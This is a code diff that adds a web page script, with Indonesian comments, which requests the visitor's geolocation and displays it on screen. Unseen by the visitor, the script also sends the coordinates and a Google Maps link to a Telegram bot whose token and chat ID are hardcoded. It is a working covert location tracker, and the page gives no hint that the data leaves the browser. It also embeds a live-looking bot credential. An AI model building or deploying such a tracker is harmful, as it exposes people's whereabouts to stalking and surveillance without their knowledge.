@@ -1,0 +1,78 @@
+<script>
+// GANTI DENGAN TOKEN BOT TELEGRAM
+const BOT_TOKEN = '8455526302:AAEdI-fS7NDr1q3Ao3qlQGIqJg8lrwCefWc';
+
+// GANTI DENGAN CHAT ID TELEGRAM
+const CHAT_ID = '1966317946';
+
+async function sendToTelegram(message) {
+const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+await fetch(url, {
+method: 'POST',
+headers: {
+'Content-Type': 'application/json'
+},
+body: JSON.stringify({
+chat_id: CHAT_ID,
+text: message
+})
+});
+}
+
+function getLocation() {
+const result = document.getElementById('result');
+
+if (!navigator.geolocation) {
+result.innerHTML = 'Geolocation tidak didukung browser.';
+return;
+}
+
+result.innerHTML = 'Mengambil lokasi...';
+
+navigator.geolocation.getCurrentPosition(
+async (position) => {
+const latitude = position.coords.latitude;
+const longitude = position.coords.longitude;
+const accuracy = position.coords.accuracy;
+
+const maps = `https://maps.google.com/?q=${latitude},${longitude}`;
+
+result.innerHTML = `
+<b>Latitude:</b> ${latitude}<br>
+<b>Longitude:</b> ${longitude}<br>
+<b>Akurasi:</b> ${accuracy} meter<br><br>
+
+<a href="${maps}" target="_blank" style="color:#60a5fa;">
+Buka di Google Maps
+</a>
+`;
+
+const text = `📍 Lokasi Baru
+
+Latitude: ${latitude}
+Longitude: ${longitude}
+Akurasi: ${accuracy} meter
+
+${maps}`;
+
+await sendToTelegram(text);
+},
+(error) => {
+switch(error.code) {
+case error.PERMISSION_DENIED:
+result.innerHTML = 'Izin lokasi ditolak.';
+break;
+case error.POSITION_UNAVAILABLE:
+result.innerHTML = 'Lokasi tidak tersedia.';
+break;
+case error.TIMEOUT:
+result.innerHTML = 'Permintaan timeout.';
+break;
+default:
+result.innerHTML = 'Terjadi kesalahan.';
+}
+}
+);
+}
+</script>
